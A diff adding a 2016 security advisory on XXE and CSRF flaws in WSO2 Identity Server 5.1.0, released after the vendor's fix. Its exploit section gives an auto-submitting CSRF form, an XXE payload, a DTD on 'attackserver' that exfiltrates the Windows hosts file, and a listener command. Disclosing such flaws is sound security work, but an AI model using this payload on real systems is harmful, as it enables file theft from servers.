@@ -1,0 +1,135 @@
+[+] Credits: John Page aka HYP3RLINX
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:
+http://hyp3rlinx.altervista.org/advisories/WSO2-IDENTITY-SERVER-v5.1.0-XML-External-Entity.txt
+
+[+] ISR: ApparitionSec
+
+
+Vendor:
+=============
+www.wso2.com
+
+
+Product:
+============================
+Wso2 Identity Server v5.1.0
+
+As the industry’s first enterprise identity bus (EIB), WSO2 Identity Server
+is the central backbone
+that connects and manages multiple identities across applications, APIs,
+the cloud, mobile, and Internet
+of Things devices, regardless of the standards on which they are based. The
+multi-tenant WSO2 Identity Server
+can be deployed directly on servers or in the cloud, and has the ability to
+propagate identities across geographical
+and enterprise borders in a connected business environment.
+
+
+Vulnerability Type:
+============================
+XML External Entity / CSRF
+
+
+CVE Reference(s):
+===================
+CVE-2016-4312 (XXE)
+CVE-2016-4311 (CSRF)
+
+
+Vulnerability Details:
+=====================
+
+
+WSO2IS XML parser is vulnerable to XXE attack in the XACML flow, this can
+be exploited when XML input containing a reference to an
+external entity is processed by a weakly configured XML parser. The attack
+leads to the disclosure and exfiltration of confidential
+data and arbitrary system files, denial of service, server side request
+forgery, port scanning from the perspective of the machine
+where the parser is located (localhost), and other system impacts.
+
+The exploit can be carried out locally by an internal malicious user or
+remote via CSRF if an authenticated user clicks an attacker
+supplied link or visits a evil webpage. In case of WSO2IS system files can
+be read / exfiltrated to the remote attackers server
+for safe keeping -_-
+
+References:
+https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2016-0096
+
+
+Exploit code(s):
+===============
+
+XXE POC, exfiltrate the victims Windows hosts file to our remote server.
+
+1) Form for the XXE POST request.
+
+<form  id='XXE' action="
+https://victim-server:9443/carbon/entitlement/eval-policy-submit.jsp?withPDP=false"
+method="post">
+<textarea rows="20" cols="100" name="txtRequest">
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE roottag [
+<!ENTITY % file SYSTEM "C:\Windows\System32\drivers\etc\hosts">
+<!ENTITY % dtd SYSTEM "http://attackserver:8080/payload.dtd">
+%dtd;]>
+<Request xmlns="urn:oasis:names:tc:xacml:3.0:core:schema:wd-17"
+CombinedDecision="false" ReturnPolicyIdList="false">
+<Attributes>
+<Attribute>&send;</Attribute>
+</Attributes>
+</Request>
+&lt;/textarea&gt;
+<input type="hidden" name="forwardTo" value="eval-policy.jsp">
+<script>document.getElementById('XXE').submit()</script>
+</form>
+
+
+2) DTD file on attacker server.
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://attackserver:8080?%file;'>">
+%all;
+
+
+3) On attack server create listener for the victims HTTP request.
+
+python -m SimpleHTTPServer 8080
+
+
+Disclosure Timeline:
+============================================
+Vendor Notification: May 6, 2016
+Vendor Acknowledgement: May 6, 2016
+Vendor Fix / Customer Alerts: June 30, 2016
+August 12, 2016  : Public Disclosure
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+===============
+High
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no
+warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the
+information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author
+prohibits any malicious use of security related information
+or exploits by the author or elsewhere.
+
+HYP3RLINX
